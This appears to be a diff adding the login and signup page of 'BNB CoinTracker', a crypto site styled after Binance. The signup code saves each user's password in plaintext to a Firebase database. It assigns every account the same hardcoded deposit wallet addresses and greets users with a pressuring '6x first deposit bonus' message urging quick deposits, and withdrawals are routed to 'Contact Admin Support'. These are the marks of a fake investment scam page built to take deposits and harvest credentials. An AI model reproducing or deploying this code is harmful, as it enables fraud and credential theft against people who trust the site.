@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" integrity="sha512-E8QSvWZ0eCLGk4km3hxSsNmGWbLtSCSUcewDQPQWZF6pEU8GlT8a5fF32wOl1i8ftdMhssTrF/OhyGWwonTcXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        
+        <!-- Service worker tips -->
+        <link rel="icon" href="../svg/binance.svg">
+        
+        <!-- Bootstrap link -->
+        <link rel="stylesheet" href="css/bootstrap.css">
+        <link rel="stylesheet" href="css/style.css">
+        <link rel="stylesheet" href="../css/style.css">
+        
+        <style>
+            :root{
+                --primary-color: #F8F7FA;
+            }
+            body{
+                font-family: 'Poppins', sans-serif;
+                font-weight: 300;
+                font-size: 15px;
+                line-height: 1.7;
+                background: var(--primary-color);
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+                overflow-x: hidden;
+            }
+            
+
+            .container-wrap {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                width: 100%;
+                padding-bottom: 4em;
+                height: auto;
+            }
+            /* width */
+            ::-webkit-scrollbar {
+                width: 0.35em;
+                margin: 2em 0;
+            }
+            /* Track */
+            ::-webkit-scrollbar-track {
+                box-shadow: inset 0 0 5px #b4b4b4; 
+            }
+            /* Handle */
+            ::-webkit-scrollbar-thumb {
+                background: #adadad; 
+                border-radius: 0.5em;
+            }
+            /* Handle on hover */
+            ::-webkit-scrollbar-thumb:hover {
+                background: #8a8a8a; 
+            }
+            /* -------------------- */ 
+            a {
+                cursor: pointer;
+                transition: all 200ms linear;
+            }
+            a:hover {
+                text-decoration: none;
+            }
+            .link {
+                color: #000;
+            }
+            .link:hover {
+                color: #c4c3ca;
+            }
+            h4 {
+                font-weight: 600;
+            }
+
+
+            .card-3d-wrap {
+                position: relative;
+                width: 440px;
+                margin: auto;
+                flex-direction: column;
+                max-width: 90%;
+                overflow: hidden;
+                height: auto;
+                -webkit-transform-style: preserve-3d;
+                transform-style: preserve-3d;
+                perspective: 800px;
+                margin-top: 60px;
+            }
+
+
+            .form-group{ 
+                position: relative;
+                width: 100%;
+                display: block;
+                margin: 0;
+                padding: 0;
+            }
+            .form-style {
+                padding: 13px 20px;
+                height: 48px;
+                width: 100%;
+                font-weight: 500;
+                border-radius: 4px;
+                font-size: 14px;
+                line-height: 22px;
+                background: var(--primary-color);
+                letter-spacing: 0.5px;
+                outline: var(--yellow-background);
+                border: 1.75px solid var(--yellow-background);
+                -webkit-transition: all 200ms linear;
+                transition: all 200ms linear;
+            }
+
+            #card-3d-wrap-up {
+                display: none;
+                flex-direction: column;
+            }
+            #card-3d-wrap-in {
+                display: flex;
+                flex-direction: column;
+            }
+
+            .log-btn{  
+                border-radius: 4px;
+                height: 44px;
+                font-size: 13px;
+                color: var(--cont-dark-font);
+                font-weight: 600;
+                text-transform: uppercase;
+                padding: 0 30px;
+                letter-spacing: 1px;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                border: 2px solid var(--yellow-background);
+                opacity: 0.85;
+                background: var(--yellow-background);
+                width: 100%;
+                box-shadow: 0 8px 24px 0 rgba(255,235,167,.2);
+            }
+            .log-btn:active,
+            .log-btn:focus{  
+                opacity: 1;
+            }
+            .log-btn:hover{  
+                opacity: 1;
+            }
+
+            
+            .footer-section {
+                align-items: center;
+                display: flex;
+                font-weight: 600;
+                font-size: 0.85em;
+                height: 2.05em;
+                justify-content: center;
+                width: 100%;
+            }
+
+            /* Dark mode theme */
+            @media (prefers-color-scheme: dark) {
+                :root{
+                    --primary-color: #212123;
+                }
+                .link {
+                    color: #fcd436;
+                }
+                .link:hover {
+                    color: #fcd436bf;
+                }
+            }
+        </style>
+    </head>
+    <body class="index-page-container">
+        <div class="section">
+            <!-- -------------------- Header Container -------------------- -->
+                <div class="help-header-wrap">
+                    <div class="container">
+                        <div class="help-header-container">
+                            <div class="header-con first-section" onclick="document.location.href='../index.html'">
+                                <div class="nav-logo-img">
+                                    <img src="../svg/binance.svg" alt="logo" class="img-fluid">
+                                </div>
+                                <span class="nav-wen-name">BNB CoinTracker</span>
+                            </div>
+                            <!-- Right container-->
+                            <div class="help-header-img"></div>
+                        </div>
+                    </div>
+                </div>
+            <!-- -------------------- -------------------- -------------------- -->
+            <!-- -------------------- -------------------- -------------------- -->
+
+            <div class="container-wrap">
+                <div class="container">
+                    <div class="card-3d-wrap">
+                        <h4 class="mb-2" id="logName">Log Into Personal Account</h4>
+                        <center><small><span id="error" style="color: #ff0000;text-align: center;"></span></small></center>
+                        <!-- Login Account Container -->
+                        <div id="card-3d-wrap-in" class="mt-5">
+                            <div class="form-group">
+                                <h6>Email</h6>
+                                <input type="email" onchange="getLogEmail(event)" name="logemail" class="form-style" id="logemail" autocomplete="off" required>
+                            </div>	
+                            <div class="form-group mt-4">
+                                <h6>Password</h6>
+                                <input type="password" onchange="getLogPass(event)" name="logpass" class="form-style" id="logpass" autocomplete="off" required>
+                            </div>
+                            <h6 class="mb-0 mt-4 text-center"><a onclick="document.location.href='js/supp.html'" class="link">Forgoten your password? Contact Support</a></h6>
+                            <button class="log-btn mt-4" onclick="login()" id="login-id-btn">Submit</button>
+                            <h6 class="mt-4">Don't have an account? <a onclick="changeToLogup()" class="link">Create new account now!</a></h6>
+                        </div>
+
+                        <!-- Create Account Container -->
+                        <div id="card-3d-wrap-up" class="mt-5">
+                            <div class="form-group">
+                                <h6>Your Full Name</h6>
+                                <input type="text" onchange="getName(event)" name="logname" id="name" class="form-style" id="logname" autocomplete="off" required>
+                            </div>	
+                            <div class="form-group mt-4">
+                                <h6>Email</h6>
+                                <input type="email" onchange="getEmail(event)" name="logemail" id="email" class="form-style" id="logemail" autocomplete="off" required>
+                            </div>	
+                            <div class="form-group mt-4">
+                                <h6>Custom Password</h6>
+                                <input type="password" onchange="getPassword(event)" id="password" name="pass" class="form-style" id="logpass" autocomplete="off" required>
+                            </div>
+                            <h6 class="mt-4">By creating an account, I agree to BNB's <a onclick="document.location.href='policy.html'" class="link">Terms of service and Privacy Policy</a></h6>
+                            <button class="log-btn mt-3" onclick="signUp()" id="sign-id-btn">Submit</button>
+                            <h6 class="mt-4">Already have an account? <a onclick="changeToLogin()" class="link">Sign into account</a></h6>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+                
+
+
+
+
+        <!--  -------------------- -------------------- FOOTER SECTION -------------------- -------------------- -->
+        <div class="footer-section" id="footer-section" style="padding: 1.5vh 0"></div>
+        <!--  -------------------- -------------------- -------------------- -------------------- -------------------- -->
+    </body>
+    <script src="js/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.7/firebase.js"></script>
+    <script>
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        var firebasefiledir = firebase.database().ref('User');
+
+        // -------------------------------------------- main configuration
+        firebase.auth().onAuthStateChanged((user)=>{
+            if(user){
+                location.replace("dashboard.html")
+            }
+        })
+
+        // Page toggle function
+        function changeToLogin() {
+            document.getElementById("card-3d-wrap-up").style.display = 'none';
+            document.getElementById("card-3d-wrap-in").style.display = 'flex';
+            document.getElementById("logName").innerHTML = `
+                            Log Into Personal Account
+                        `;
+        }
+        function changeToLogup() {
+            document.getElementById("card-3d-wrap-up").style.display = 'flex';
+            document.getElementById("card-3d-wrap-in").style.display = 'none';
+            document.getElementById("logName").innerHTML = `
+                Create Personal Account
+            `;
+        }
+
+        // Login
+        var logEmail;
+        var logPass;
+        function getLogEmail(e) {
+            logEmail = e.target.value;
+        }
+        function getLogPass(e) {
+            logPass = e.target.value;
+        }
+        function login(){
+            document.getElementById("login-id-btn").innerHTML = `Loading...`;
+            const email = logEmail;
+            const password = logPass;
+            firebase.auth().signInWithEmailAndPassword(email, password)
+            .then(function(response){
+                console.log("success");
+                document.getElementById("login-id-btn").innerHTML = `Loading...`;
+            })
+            .catch((error)=>{
+                document.getElementById("error").innerHTML = error.message
+                document.getElementById("login-id-btn").innerHTML = `Retry..`;
+            })
+        }
+
+        // Sign up
+        var dname;
+        var demail;
+        var dpassword;
+        function getName(e) {
+            var mySentence = e.target.value;
+            dname = mySentence.replace(/(^\w{1})|(\s+\w{1})/g, letter => letter.toUpperCase());
+        }
+        function getEmail(e) {
+            demail = e.target.value;
+        }
+        function getPassword(e) {
+            dpassword = e.target.value;
+        }
+        
+        
+        //
+        function getNthWord(string, n){
+            var words = string.split(" ");
+            return words[n-1];
+        }
+        //
+        function getTimeFormat(time){
+            var timeSplit = time.split(":");
+            var timeNumber = Number(timeSplit[0])
+            if (timeNumber > 12) {
+                var timeWrap = timeNumber - 12
+                var timeDisplay = `${timeWrap}:${timeSplit[1]} PM`;
+                return timeDisplay;
+            } else if(timeNumber < 12) {
+                var timeWrap = timeNumber
+                var timeDisplay = `${timeWrap}:${timeSplit[1]} AM`;
+                return timeDisplay;
+            }
+        }
+        //
+        function monthNumber(month) {
+            var monthNum;
+            if(month === `Jan`){
+                return monthNum = `01`;
+            } else if(month === `Feb`){
+                return monthNum = `02`;
+            } else if(month === `Mar`){
+                return monthNum = `03`;
+            } else if(month === `Apr`){
+                return monthNum = `04`;
+            } else if(month === `May`){
+                return monthNum = `05`;
+            } else if(month === `Jun`){
+                return monthNum = `06`;
+            } else if(month === `Jul`){
+                return monthNum = `07`;
+            } else if(month === `Aug`){
+                return monthNum = `08`;
+            } else if(month === `Sep`){
+                return monthNum = `09`;
+            } else if(month === `Oct`){
+                return monthNum = `10`;
+            } else if(month === `Nov`){
+                return monthNum = `11`;
+            } else if(month === `Dec`){
+                return monthNum = `12`;
+            } else{
+                return monthNum = undefined;
+            }
+        }
+        //
+        function fileNameDir(client) {
+            var year = getNthWord(client, 3);
+            var month = monthNumber(getNthWord(client, 1));
+            var day = getNthWord(client, 2).slice(0, -1);
+            var time = getNthWord(client, 4).split(`:`);
+            var timeResult = `${time[0]}${time[1]}${time[2]}`;
+            var result = `${year}${month}${day}${timeResult}`;
+            return result;
+        }
+        function clientFileDate(client) {
+            var year = getNthWord(client, 4);
+            var month = getNthWord(client, 2);
+            var day = getNthWord(client, 3);
+            var time = getNthWord(client, 5);
+            var result = `${month} ${day}, ${year} ${time}`;
+            return result;
+        }
+        // Color palette
+        var colorPalette =[
+            "#3D52A0", "#7091E6", "#8697C4", "#010127", "#2B1B17", "#244855", "#E64833", "#874F41", "#964734", "#003135", 
+            "#3E263E", "#865D36", "#050A44", "#0A21C0", "#C50900", "#273DA4", "#2E3944", "#124E26", "#124E66", "#ED3D12", 
+            "#D6536D", "#EFB10D", "#AFD205", "#45A29E", "#5D001E", "#9A1750", "#D79902", "#F13C10", "#4056A1", "#CB246F", 
+            "#854900", "#33266E", "#2E5F3D", "#802BB1", "#b15026", "#00887A", "#314455", "#3369E8", "#D50F25", "#EEB211", 
+            "#009925", "#666666", "#120312", "#160D0B", "#253529"
+        ]
+        var selectPaletteNumber = Math.floor(Math.random() * 44);
+        var selectPalette = colorPalette[selectPaletteNumber];
+        
+        function signUp(){
+            document.getElementById("sign-id-btn").innerHTML = `Loading...`;
+            const email = demail;
+            const password = dpassword;
+            firebase.auth().createUserWithEmailAndPassword(email, password)
+            .then(function(response){
+                var uuid = response.user.uid
+                var commentDate = clientFileDate(`${new Date()}`);
+                var fileName = fileNameDir(`${commentDate}`);
+                var messageDate = `${getNthWord(commentDate, 2).slice(0, -1)}・${getNthWord(commentDate, 1)}`
+                firebasefiledir.push({
+                    notification: {
+                        message: `
+                            <div class="notify-card-wrap">
+                                <div class="assets-card-background"></div>
+                                <div class="container">
+                                    <div class="assets-card-first-pad">
+                                        <div class="container">
+                                            <!-- Asset card first row -->
+                                            <div class="assets-card-first-row">
+                                                <div class="assets-card-first-left">
+                                                    <div class="assets-card-binance-logo">
+                                                        <img src="svg/user.svg" class="img-fluid">
+                                                    </div>
+                                                    <span class="assets-card-user-txt one-line">BNB CoinTracker</span>
+                                                </div>
+                                                <div class="notification-message-date-con">
+                                                    <div class="notification-message-date">${messageDate}</div>
+                                                    ・
+                                                    <div class="assets-card-first-img">
+                                                        <img src="svg/binance.svg" class="img-fluid">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <!--  -->
+                                            <div class="notify-img-txt">
+                                                Welcome to BNB CoinTracker, you have a very limited time to take advantage of the ongoing 6x first deposit bonus. All you need to do is confirm this account and deposit funds before the liquidity runs out. The promotion also includes the benefits of the fastest transaction time, 98% reduced transaction charges, and, most importantly, the world's most powerful and monitored security system.
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- Seperation line -->
+                                <div class="assets-card-line"></div>
+                                
+                                <div class="assets-card-second-pad">
+                                    <div class="container-fluid">
+                                        <div class="container-fluid">
+                                            <div class="row">
+                                                <div class="col-12 p-2">
+                                                    <div class="notify-card-btn" onclick="HomeToNotification()">
+                                                        Verify account
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        `
+                    },
+                    bot: {
+                        percent: 0,
+                        totalbal: 0,
+                        bankid: "Contact Admin Support"
+                    },
+                    wallet: {
+                        avalanche: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=1-XSTyObQQPjm4_SdPMWFWrgKvxvMMHV9&sz=w1000"
+                        },
+                        binanceusd: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=1-cCiQDscaGsfikRSH85Snr5yz6Vts2ac&sz=w1000"
+                        },
+                        binanceusdt: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=1-_ecE3fOefKegrl9BOnAYJ-WXv25zmOv&sz=w1000"
+                        },
+                        bitcoin: {
+                            address: "bc1q0xwuh6qdlyxmh52rfd509krg6e2v2vul6ca978",
+                            url: "https://drive.google.com/thumbnail?id=1-ezJe71DJN_4ZhTblr_zBa5AuzPYdP79&sz=w1000"
+                        },
+                        bnbcoin:{
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=1-gje5CVbQw4nGFhgat9H2x_sHGxkFVxI&sz=w1000"
+                        },
+                        dogecoin:{
+                            address: "D6avmUPuYcvS31erZpgqspzPbNEjgMsvJX",
+                            url: "https://drive.google.com/thumbnail?id=1-tHw-nZ3K4-l8Sba9siFWUFKBzKKO3tF&sz=w1000"
+                        },
+                        ethereum: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=1-gje5CVbQw4nGFhgat9H2x_sHGxkFVxI&sz=w1000"
+                        },
+                        litecoin: {
+                            address: "ltc1q0l40kk9wa9dd74l4deuw53fzc2hnqc47grwzl6",
+                            url: "https://drive.google.com/thumbnail?id=10-fK9XFwaQThYlzxvx5jGRlGC9HbJLDw&sz=w1000"
+                        },
+                        solana: {
+                            address: "AsouuRkd5XgP7xT4U4URgV1s4edXCnuCkGJvj5RcdS5z",
+                            url: "https://drive.google.com/thumbnail?id=104bH2oMsthYdacbCLBpM-iW9iHCPrgga&sz=w1000"
+                        },
+                        tetherusd: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=10RPGbtTpsuLk6hRpFsanM4xGaL9kokR7&sz=w1000"
+                        },
+                        tetherusdt: {
+                            address: "TLHZXrimMzdxVRwn2sBScNtF2L2FpNRvH3",
+                            url: "https://drive.google.com/thumbnail?id=10T7RQLTXSLwF7xTIOnMX8_pKEKLZiLSo&sz=w1000"
+                        },
+                        tron: {
+                            address: "TLHZXrimMzdxVRwn2sBScNtF2L2FpNRvH3",
+                            url: "https://drive.google.com/thumbnail?id=10JjaTVIty3s25r9GGrBZSh1aR-Dt9GI_&sz=w1000"
+                        },
+                        usdcoin: {
+                            address: "0xE1CBdfD02Fd094612f8749DbE60E11b08B2436Af",
+                            url: "https://drive.google.com/thumbnail?id=10KUapJIbMA5KKFKHSxZ9CQ2Qg8vrZuwS&sz=w1000"
+                        },
+                    },
+                    botactive: false,
+                    fira: false,
+                    invite: "0.00",
+                    messageAlert: false,
+                    deficit: 0,
+                    invitesnumber: "--",
+                    bitcoin: 0,
+                    ethereum: 0,
+                    litecoin: 0,
+                    dogecoin: 0,
+                    tetherusd: 0,
+                    tron: 0,
+                    tetherusdt: 0,
+                    usdcoin: 0,
+                    bnbcoin: 0,
+                    binanceusd: 0,
+                    avalanche: 0,
+                    binanceusdt: 0,
+                    solana: 0,
+                    email: demail,
+                    name: dname,
+                    password: dpassword,
+                    userurl: "BNB CoinTracker",
+                    userstatus: false,
+                    uid: response.user.uid
+                });
+                firebase.database().ref(`member/${uuid}`).set({
+                    color: selectPalette,
+                    name: dname,
+                });
+                
+                document.getElementById("sign-id-btn").innerHTML = `Loading...`;
+            })
+            .catch((error) => {
+                document.getElementById("error").innerHTML = error.message;
+                document.getElementById("sign-id-btn").innerHTML = `Retry..`;
+                console.log(error);
+            });
+        }
+
+
+
+        //  Display date in assets page
+        function showDate() {
+            let date = new Date();
+            let y = date.getFullYear();
+            let assetsDate = document.querySelector("#footer-section");
+            assetsDate.innerHTML = `BNB · ${y}`;
+        };
+        showDate();
+        // -------------------- 
+    </script>
+</html>
